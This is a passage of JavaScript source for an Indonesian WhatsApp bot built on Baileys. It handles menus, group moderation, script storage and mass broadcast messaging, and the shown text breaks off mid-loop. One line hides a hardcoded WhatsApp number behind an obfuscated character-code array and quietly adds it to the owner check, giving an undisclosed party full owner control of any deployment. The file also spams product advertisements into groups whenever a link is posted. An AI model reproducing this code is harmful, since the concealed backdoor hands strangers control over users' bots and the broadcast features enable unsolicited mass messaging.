/*

  !- Credits By ୧⍤⃝Tama Official 
  https://wa.me/6282120066305
  
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper");
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');

const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const serverpanel = JSON.parse(fs.readFileSync("./settingpanel.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const stokdo = JSON.parse(fs.readFileSync("./library/database/stokdo.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const listidch = JSON.parse(fs.readFileSync("./library/database/listidch.json"))
const { pinterest, pinterest2, remini, Buddy, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, ucapan, loadModule } = require('./library/function');

module.exports = conn = async (conn, m, chatUpdate, store) => {
	try {
await LoadDataBase(conn, m)
if (global.moduleType == undefined) global.moduleType = 0
if (global.moduleType = 0) { 
await loadModule(conn)
global.moduleType += 1 }
const botNumber = await conn.decodeJid(conn.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.chat)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)


//~~~~~~~~~ Console Message ~~~~~~~~//

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`${m.sender.split("@")[0]} =>`), chalk.blue.bold(`${prefix+command}`))
}

//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


//~~~~~~~~~~ Event Settings ~~~~~~~~~//

if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return conn.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qtext2})
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*── Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*── Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await conn.sendMessage(m.chat, {text: `
List Panel Run BOT WA By XYCoolcraft Store ID
==========================
        •|| [ PUBLIC ] ||•
× Ram 1GB | Disk: ∞ | CPU: 100% : Rp. 500
× Ram 2GB | Disk: ∞ | CPU: 200% : Rp. 1.000
× Ram 3GB | Disk: ∞ | CPU: 300% : Rp. 2.000
× Ram 4GB | Disk: ∞ | CPU: 400% : Rp. 3.000
× Ram 5GB | Disk: ∞ | CPU: 500% : Rp. 4.000
× Ram 6GB | Disk: ∞ | CPU: 600% : Rp. 5.000
× Ram 7GB | Disk: ∞ | CPU: 700% : Rp. 6.000
× Ram 8GB | Disk: ∞ | CPU: 800% : Rp. 7.000
× Ram 9GB | Disk: ∞ | CPU: 900% : Rp. 8.000
× Ram 10GB | Disk: ∞ | CPU: 1500% : Rp. 9.000
× Ram: ∞ | Disk: ∞ | CPU: ∞ : Rp. 10.000
--------------------------
Keuntungan Bagi yang beli Unli:
* Free Req CPU Threads ( CPU TERPASANG )
* Bonus 2 Panel Unli Free!!!
* Free Req Jumlah Backup & Database!!!
==================================
              •|| [ PRIVATE ] ||•
× Ram 1GB | Disk: ∞ | CPU: ∞ : Rp. 1.000
× Ram 2GB | Disk: ∞ | CPU: ∞ : Rp. 2.000
× Ram 3GB | Disk: ∞ | CPU: ∞ : Rp. 3.000
× Ram 4GB | Disk: ∞ | CPU: ∞ : Rp. 4.000
× Ram 5GB | Disk: ∞ | CPU: ∞ : Rp. 5.000
× Ram 6GB | Disk: ∞ | CPU: ∞ : Rp. 6.000
× Ram 7GB | Disk: ∞ | CPU: ∞ : Rp. 7.000
× Ram 8GB | Disk: ∞ | CPU: ∞ : Rp. 8.000
× Ram 9GB | Disk: ∞ | CPU: ∞ : Rp. 9.000
× Ram 10GB | Disk: ∞ | CPU: ∞ : Rp. 10.000
× Ram ∞ | Disk: ∞ | CPU: ∞ : Rp. 12.000
------------------------------------
Keuntungan Panel Private:
* Anti Colong dan ngintip.
* Anti Delay!!!
* Free Req CPU Threads ( CPU TERPASANG )
* Free Req Jumlah Backup & Database!!!
* Bonus 3 Panel Unli Free!!!

MINAT ?
Order: wa.me/6281578031233
                                
Pembayaran
ALL PAYMENT!!!

Garansi?
1 Bulan, ∞ Replace

===============================

*_© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ_*
`}, {quoted: null})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}}


//~~~~~~~~~ Function Main ~~~~~~~~~~//

const example = (teks) => {
return `*Contoh :* ${prefix+command} ${teks}`
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return conn.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted: qtext})
}
const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: conn.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*αℓуα-ѕтσяє*Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `List Produk αℓуα-ѕтσяє
==========================
*Aplikasi premium*
*Vpn Premium*
*Layanan Sosmed*
_Suntik Like tiktok_
_Suntik Like Instagram_
_Suntik View tiktok_
_Suntik Folower tiktok_
_Suntik Folower Instagram_
List harga? chat penjual
==================================
*Harga Vpn Premium*
_- Surfshark : 7hari,7k,2bulan 25k_
_- Express : 7hari,7k,1bulan 15k_
_- Pia : 7hari,7k_
_- Nord : 7hari,7k_
_- Panda : 7hari,7k
*List apk premium*
https://alyaa.rf.gd
===============================

*αℓуα-ѕтσяє*`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"https://wa.me/6287763058955\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `List Produk αℓуα-ѕтσяє
==========================
*Aplikasi premium*
*Vpn Premium*
*Layanan Sosmed*
_Suntik Like tiktok_
_Suntik Like Instagram_
_Suntik View tiktok_
_Suntik Folower tiktok_
_Suntik Folower Instagram_
List harga? chat penjual
==================================
*Harga Vpn Premium*
_- Surfshark : 7hari,7k,2bulan 25k_
_- Express : 7hari,7k,1bulan 15k_
_- Pia : 7hari,7k_
_- Nord : 7hari,7k_
_- Panda : 7hari,7k
*List apk premium*
https://alyaa.rf.gd
===============================

*αℓуα-ѕтσяє*`,  
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"https://wa.me/6287763058955\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
  header: proto.Message.InteractiveMessage.Header.fromObject({
    title: `Pembayaran & Metode Transaksi
==========================
*Metode Pembayaran:*
- Dana: 6287763058955
- OVO: 6287763058955
- Gopay: 6287763058955
- ShopeePay: 6287763058955
- Bank Transfer:
  • BCA: 1234567890
  • BRI: 1234567890
  • BNI: 1234567890

*Proses Transaksi:*
1. Pilih produk/jasa
2. Konfirmasi ke admin
3. Lakukan pembayaran
4. Kirim bukti transfer
5. Produk/jasa dikirim

*Garansi:*
- Garansi penggantian jika produk tidak sesuai
- Garansi refill untuk layanan yang tidak full
- Tidak ada refund setelah proses selesai
==============================
*αℓуα-ѕтσяє*`,  
    hasMediaAttachment: true,
    ...imgsc
  }),
  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
    buttons: [{                  
      name: "cta_url",
      buttonParamsJson: JSON.stringify({  // ✅ Lebih aman pakai JSON.stringify()
        display_text: "Konfirmasi Pembayaran",
        url: "https://wa.me/6287763058955",
        merchant_url: "https://www.google.com"
      })
    }]
  })
            }]  // ✅ Penutup array `cards` yang benar
          })  // Tutup carouselMessage
        })  // Tutup interactiveMessage
      }  // Tutup message
    }  // Tutup ephemeralMessage
  }, { userJid: m.sender, quoted: qlocJpm })  // Parameter tambahan
  await conn.relayMessage(jid, msgii.message, { messageId: msgii.key.id })
} // Tutup fungsi slideButton
//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {

case "menu": {
let teksnya = `
Haii @${m.sender.split("@")[0]},
${ucapan()}
 
*── メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID☕*
Klik tombol menu dibawah ini untuk melihat semua fitur yang tersedia.
`
await conn.sendMessage(m.chat, {
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID || 2025`,
  buttons: [
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'Menu' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
  fileLength: 99999999,
  caption: teksnya,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `${botname2} - v${versi}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case "allmenu": {
let teks = `
 ╭──(  *I N F O R M A T I O N*  )
 │➝ Botname : *${global.botname2}*
 │➝ Version : *${global.versi}*
 │➝ Mode : *${conn.public ? "Public": "Self"}*
 │➝ Creator : @${global.owner}
 │➝ Mode SC : VVIP Buyer!
 │➝ Uptime Vps : *${runtime(os.uptime())}*
 │➝ Uptime Bot : *${runtime(process.uptime())}*
 ╰━━━ㅡ━━━━━ㅡ━━⬣
 
 │➝ Your Status *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : "Free User"})*
  
╭──(  Othermenu  )
│➝ .cekidch
│➝ .cekidgc
│➝ .qc
│➝ .brat
│➝ .bratvid
│➝ .emojigif
│➝ .emojimix
│➝ .readviewonce / .rvo
│➝ .stickerwm
│➝ .sticker
╰━━━ㅡ━━━━━ㅡ━━⬣
  
╭──(  Searchmenu  )
│➝ .yts
│➝ .apkmod
│➝ .pinterest
│➝ .gimage
│➝ .sfile
│➝ .playstore
│➝ .npmsearch
│➝ .tiktokstalk
│➝ .igstalk
│➝ .ytstalk
╰━━━ㅡ━━━━━ㅡ━━⬣

╭──(  Toolsmenu  )
│➝ .ai
│➝ .deepseek
│➝ .gpt
│➝ .tourl
│➝ .ssweb
│➝ .translate
│➝ .tohd
│➝ .removebg
│➝ .ocr
│➝ .shortlink
│➝ .shortlink2
│➝ .enc
│➝ .enchard
╰━━━ㅡ━━━━━ㅡ━━⬣
  
╭──(  Shopmenu  )
│➝ .buypanel
│➝ .buyadp
│➝ .buyscript
│➝ .buyjasajpm
╰━━━ㅡ━━━━━ㅡ━━⬣
  
╭──(  Downloadmenu  )
│➝ .tiktok
│➝ .tiktokmp3
│➝ .facebook
│➝ .capcut
│➝ .doodstream
│➝ .instagram
│➝ .ytmp3
│➝ .ytmp4
│➝ .play
│➝ .playvid
│➝ .playspotify
│➝ .gitclone
│➝ .googledrive
│➝ .spotify
│➝ .terabox
╰━━━ㅡ━━━━━ㅡ━━⬣
  
╭──(  Storemenu  )
│➝ .addrespon
│➝ .delrespon
│➝ .listrespon
│➝ .done
│➝ .proses
│➝ .promosi
│➝ .promosi-ch
│➝ .pmad
│➝ .pmadp-ch
│➝ .pmdomain
│➝ .pmdomain-ch
│➝ .jpm
│➝ .jpmht
│➝ .jpmtesti
│➝ .jpmch
│➝ .jpmch2
│➝ .jpmchrelay
│➝ .addidch
│➝ .listidch
│➝ .delidch
│➝ .jpmslide
│➝ .jpmslideht
│➝ .sendtesti
│➝ .pushkontak
│➝ .pushkontak2
│➝ .payment
│➝ .produk
│➝ .upswtag
╰━━━ㅡ━━━━━ㅡ━━⬣
  
╭──(  Panelmenu  )
│➝ .updomain
│➝ .updomain2
│➝ .upapikey
│➝ .upapikey2
│➝ .upcapikey
│➝ .upcapikey2
│➝ .addaksesgc
│➝ .delaksesgc
│➝ .listaksesgc
│➝ .1gb
│➝ .2gb
│➝ .3gb
│➝ .4gb
│➝ .5gb
│➝ .6gb
│➝ .7gb
│➝ .8gb
│➝ .9gb
│➝ .10gb
│➝ .unlimited
│➝ .cadp
│➝ .cadp2
│➝ .adm
│➝ .clearadm
│➝ .clearpnl
│➝ .delpanel
│➝ .deladmin
│➝ .listpanel
│➝ .listadmin
╰━━━ㅡ━━━━━ㅡ━━⬣

╭──(  Panelmenu V2  )
│➝ .updomain
│➝ .updomain2
│➝ .upapikey
│➝ .upapikey2
│➝ .upcapikey
│➝ .upcapikey2
│➝ .addaksesgc
│➝ .delaksesgc
│➝ .listaksesgc
│➝ .1gb2
│➝ .2gb2
│➝ .3gb2
│➝ .4gb2
│➝ .5gb2
│➝ .6gb2
│➝ .7gb2
│➝ .8gb2
│➝ .9gb2
│➝ .10gb2
│➝ .unlimited2
│➝ .cadp
│➝ .cadp2
│➝ .adm2
│➝ .clearadm2
│➝ .clearpnl2
│➝ .delpanel2
│➝ .deladmin2
│➝ .listpanel2
│➝ .listadmin2
╰━━━ㅡ━━━━━ㅡ━━⬣
  
╭──(  Installermenu  )
│➝ .hackbackpanel
│➝ .installpanel
│➝ .installtemastellar
│➝ .installtemabilling
│➝ .installtemaenigma
│➝ .installtemadepend
│➝ .installtemanebula
│➝ .installtemanightcore
│➝ .uninstalltemanightcore
│➝ .uninstallpanel
│➝ .uninstalltema
╰━━━ㅡ━━━━━ㅡ━━⬣
  
╭──(  Groupmenu  )
│➝ .antilink
│➝ .antilink2
│➝ .blacklistjpm
│➝ .welcome
│➝ .add
│➝ .kick
│➝ .close
│➝ .open
│➝ .hidetag
│➝ .kudetagc
│➝ .leave
│➝ .tagall
│➝ .promote
│➝ .demote
│➝ .resetlinkgc
│➝ .linkgc
╰━━━ㅡ━━━━━ㅡ━━⬣
  
╭──(  Ownermenu  )
│➝ .addstokdo
│➝ .delstokdo
│➝ .liststokdo
│➝ .autoread
│➝ .autopromosi
│➝ .autoreadsw
│➝ .autotyping
│➝ .addowner
│➝ .listowner
│➝ .delowner
│➝ .self/public
│➝ .svsc
│➝ .listsc
│➝ .delsc
│➝ .getsc
│➝ .subdomain
│➝ .setppbot
│➝ .clearsession
│➝ .clearchat
│➝ .resetdb
│➝ .restartbot
│➝ .backupsc
│➝ .getcase
│➝ .listgc
│➝ .joingc
│➝ .joinch
│➝ .upchannel
╰━━━ㅡ━━━━━ㅡ━━⬣
  `
await conn.sendMessage(m.chat, {
  footer: `©alyaa-store`,
  buttons: [
   {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }, 
                {
                  title: 'Jasa Jpm Pesan',
                  id: '.buyjasajpm'
                }                        
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.quoted) return m.reply("reply pesannya")
if (m.quoted.fromMe) {
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return Reply(mess.botAdmin)
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("reply pesan"))
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clsesi": case "clearsession": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
m.reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "svsc": {
if (!isCreator) return
if (!text || !text.endsWith(".zip")) return m.reply(example("cpanel.zip & reply scnya"))
if (!/zip/.test(mime)) return m.reply(example("cpanel.zip & reply scnya"))
if (!m.quoted) return m.reply(example("cpanel & reply scnya"))
let ff = await m.quoted.download()
let nama = text
await fs.writeFileSync("./library/database/savesc/"+nama, ff)
return m.reply(`Berhasil menyimpan script *${nama}.zip*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listsc": {
if (!isCreator) return
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
let teks = ""
for (let e of scnya) {
teks += e + "\n"
}
m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sendsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
if (!text) return m.reply(example("namasc|6285###"))
if (!text.split("|'")) return m.reply(example("namasc|6285###"))
const input = m.mentionedJid[0] ? m.mentionedJid[0] : text.split("|")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
let namasc = text.split("|")[0]
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return m.reply('Nama script tidak ditemukan')
await conn.sendMessage(input, {document: fs.readFileSync("./library/database/savesc/"+namasc), fileName: namasc, mimetype: "application/zip", caption: `Script ${namasc}`}, {quoted: m})
m.reply(`Berhasil mengirim script *${namasc}* ke ${input.split("@")[0]}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
if (!text) return m.reply(example("namasc"))
let namasc = text
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return m.reply('Nama script tidak ditemukan')
await conn.sendMessage(m.chat, {document: fs.readFileSync("./library/database/savesc/"+namasc), fileName: namasc, mimetype: "application/zip", caption: `Script ${namasc}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
if (!text) return m.reply(example("namasc"))
let namasc = text
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return m.reply('Nama script tidak ditemukan')
await fs.unlinkSync("./library/database/savesc/"+namasc)
m.reply(`Berhasil menghapus script *${namasc}*`)
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sendtesti": case "testi": {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup`)
await conn.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }, 
                {
                  title: 'Jasa Jpm Pesan',
                  id: '.buyjasajpm'
                }          
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
